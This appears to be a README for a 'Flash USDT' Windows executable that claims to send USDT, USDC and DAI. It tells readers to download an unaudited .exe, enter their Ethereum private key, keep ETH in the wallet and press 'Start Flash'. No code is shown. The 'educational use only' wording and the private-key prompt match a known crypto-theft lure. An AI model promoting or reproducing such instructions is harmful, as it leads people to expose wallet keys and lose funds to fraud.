## 🚀 Flashing Tool 

A powerful and user-friendly desktop application compiled as a `.exe` for interacting with the Ethereum blockchain. This tool allows users to send ERC-20 token transactions (USDT, USDC, DAI) with customizable gas settings and provides real-time wallet balance monitoring. Designed for educational purposes only use responsibly! ⚠️

![Flash tool](https://github.com/user-attachments/assets/c099fa7f-3bf3-4bb3-9202-24c0bdaf2264)


## ✨ Features
- **Wallet Management**: Enter your private key to view your Ethereum address and ETH balance in real-time.
- **Token Transactions**: Send USDT, USDC to any Ethereum address with ease.
- **User-Friendly GUI**: Built with Tkinter for a simple and intuitive experience.

## 🛠️ Technical Specifications
- **Platform**: Windows (compiled as `.exe`)
- **Language**: Python 3.x
- **Libraries**:
  - `tkinter` - GUI framework
  - `web3.py` - Ethereum blockchain interaction
  - `requests` - HTTP requests
  - `webbrowser` - Browser integration
- **Supported Tokens**:
  - USDT (6 decimals)
  - USDC (6 decimals)
  - DAI (18 decimals)
- **Network**: Ethereum Mainnet via Infura
- **Transaction Encoding**: ERC-20 `transfer` method (`0xa9059cbb`)

## 📋 Requirements
- **Operating System**: Windows 10 or later
- **Python Version**: 3.8+ (if running from source)
- **Dependencies**: Install via `pip` if running from source:
  ```bash
  pip install web3.py requests
  ```
- **Infura ID**: A valid Infura Project ID is required to connect to the Ethereum network. Get one at [Infura.io](https://infura.io/).
- **ETH Balance**: A minimum of 0.025 ETH in your wallet to cover gas fees.
- **Private Key**: A valid Ethereum private key for signing transactions.

## 🚀 How to Use
1. **Download**: Grab the latest `.exe` from the [Releases](https://github.com/mr-nomad/Flash-USDT-ETH/blob/main/Flash.exe) section.
2. **Run**: Launch the `.exe` file on your Windows machine.
3. **Setup**:
   - Input your private key to load your wallet details.
   - Specify the delivery address, amount, and token type (USDT, USDC).
4. **Send**: Click "Start Flash" to execute your transfer.

## ⚠️ Notes
- Ensure your wallet has sufficient ETH to cover gas fees—transactions will fail without it!
- Double-check delivery addresses; errors may result in permanent loss of funds.
- For educational use only test in a safe environment first.

## 🌟 Contributions
Feel free to fork, submit issues, or send pull requests! Let’s make this tool even better together. 🙌
